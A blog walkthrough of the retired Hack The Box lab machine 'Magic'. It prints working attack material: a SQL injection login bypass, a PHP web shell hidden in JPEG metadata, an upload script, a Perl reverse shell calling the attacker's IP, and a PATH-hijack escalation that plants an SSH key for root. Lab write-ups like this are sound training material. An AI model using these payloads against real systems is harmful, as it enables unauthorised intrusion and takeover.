---
layout: post
title: "Magic: Hack The Box Walkthrough"
date: 2020-08-23 17:12:10 +0000
last_modified_at: 2020-08-23 17:12:10 +0000
category: Walkthrough
tags: ["Hack The Box", Magic, retired, Linux, Medium]
comments: true
image:
  feature: magic-htb-walkthrough.png
---

This post documents the complete walkthrough of Magic, a retired vulnerable [VM][1] created by [TRX][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Magic is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let's start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.185 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-04-20 05:26:26 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.185
Discovered open port 22/tcp on 10.10.10.185
```

Hmm. Nothing much to work with. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.185 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
```

Whoa. Really nothing. Anyway, here's what the site looks like.

{% include image.html image_alt="3711220a.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/3711220a.png" %}

### Authentication Bypass

There's a login page at `/login.php`.

{% include image.html image_alt="67709c9c.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/67709c9c.png" %}

We can't enter spaces in the username field but we can paste our bypass payload `admin' or 1=1-- asdf` in it.

{% include image.html image_alt="734c075b.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/734c075b.png" %}

Here we go, to the Upload page and beyond!

{% include image.html image_alt="a2c45cb9.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/a2c45cb9.png" %}

### Image Upload

The upload page `/upload.php` only takes in images in the JPG, JPEG and PNG format.

{% include image.html image_alt="1b729665.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/1b729665.png" %}

We'll just use this image `/images/hey.jpg` as our base for the upload attack.

{% include image.html image_alt="f6c3cfea.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/f6c3cfea.png" %}

The idea is to modify the Comment metadata in a JPEG file to PHP code. Check out the original Comment metadata with `exiftool`.

{% include image.html image_alt="78f1ad47.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/78f1ad47.png" %}

Let's put the following PHP into the Comment metadata.

```
# exiftool -Comment='<html><body bgcolor="black"><pre style="background-color: white"><?php echo shell_exec($_GET[0]); ?></pre></body></html>' -overwrite_original hey.jpg; cp hey.jpg hey.php
```

Once that's done, make a copy of the file and save it as `hey.php`. Now, let's make use of the simple shell script I wrote to bypass all the image filters, and to upload a PHP backdoor to the gallery.

<div class="filename"><span>upload.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.185
AUTH="admin' OR 1=1-- asdf"
COOKIE=$(mktemp -u)
FILE=$1

# login
curl -s \
     -c $COOKIE \
     --data-urlencode "username=${AUTH}&password=" \
     -o /dev/null \
     http://${HOST}/login.php

# upload
curl -s \
     -b $COOKIE \
     -H "Expect:" \
     -F "image=@${FILE};type=image/jpeg;filename=${FILE}.jpg" \
     -F "submit=Upload+Image" \
     http://${HOST}/upload.php \
| head -1 | sed 's/<.*>//'

echo "Backdoor is at http://${HOST}/images/uploads/${FILE}.jpg?0=id"

# clean up
rm -f $COOKIE
```

Let's give it a shot.

{% include image.html image_alt="bcfcac1f.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/bcfcac1f.png" %}

Over at the browser we should get the following.

{% include image.html image_alt="1e18b190.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/1e18b190.png" %}

## Low-Privilege Shell

With the backdoor open, we can finally get the coveted shell or foothold into the machine. My goto reverse shell is a Perl one-liner.

```
perl -e 'use Socket;$i="10.10.16.125";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

It's best to `urlencode` the above for best results. On my attacking machine, a `netcat` listener is waiting for the reverse shell.

{% include image.html image_alt="922b868e.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/922b868e.png" %}

:heart_eyes:

## Privilege Escalation

During enumeration of the `www-data` account, I notice that there's only one account in the machine, `theseus`. I also noted the presence of `db.php5` in `/var/www/Magic`. In the file lies the password to log in to the MySQL database service, which is listening at `3306/tcp` on the loopback interface.

{% include image.html image_alt="60d04bca.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/60d04bca.png" %}

One small problem though—there's no `mysql` in the machine!

### Port Forwarding with `socat`

Fret not. We can transfer a statically-compiled `socat` [binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) to the machine and open a listening port at a high port (or ephemeral port) and forward the incoming traffic to `127.0.0.1:3306` like so.

```
$ ./socat tcp-listen:23306,fork tcp:127.0.0.1:3306 &
```

Once that's done, we can connect to the database service with the `mysql` in my attacking machine.

{% include image.html image_alt="15cd0963.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/15cd0963.png" %}

We get `admin`'s password (`Th3s3usW4sK1ng`).

{% include image.html image_alt="80c11611.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/80c11611.png" %}

### Getting `user.txt`

With the password, we can `su` into `theseus`' account and retrieve `user.txt`.

{% include image.html image_alt="02b9c46c.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/02b9c46c.png" %}

### System Information

During enumeration of `theseus`' account, you'll notice that `theseus` is in a unique group: `users`. Member of this group is able to execute the following binary SUID to `root`. :open_mouth:

{% include image.html image_alt="eb58d541.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/eb58d541.png" %}

Upon execution of this binary, various information about the machine is printed to `stdout`. Well, the information looks strangely familiar to the output of diagnostic commands in a typical Linux distribution, e.g. `lshw`, `fdisk`, `free`, etc. This is classic privilege escalation—hijacking the `PATH` search order.

Let's just write a RSA public key we control and inject into `/root/.ssh/authorized_keys` like so. I'm targeting `fdisk`.

```
$ echo -ne '#!/bin/sh\nmkdir -p /root/.ssh; echo ssh-rsa AAA.../E= >> /root/.ssh/authorized_keys' > /tmp/fdisk
$ chmod +x /tmp/fdisk
$ export PATH=/tmp:$PATH
```

We should be able to get a `root` shell.

{% include image.html image_alt="a000331e.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/a000331e.png" %}

### Getting `root.txt`

Retrieving `root.txt` with a `root` shell is trivial.

{% include image.html image_alt="7ac6cb63.png" image_src="/c8a031b2-e96f-4055-bc28-99109f5c14ad/7ac6cb63.png" %}

:dancer:


[1]: https://www.hackthebox.eu/home/machines/profile/241
[2]: https://www.hackthebox.eu/home/users/profile/31190
[3]: https://www.hackthebox.eu/
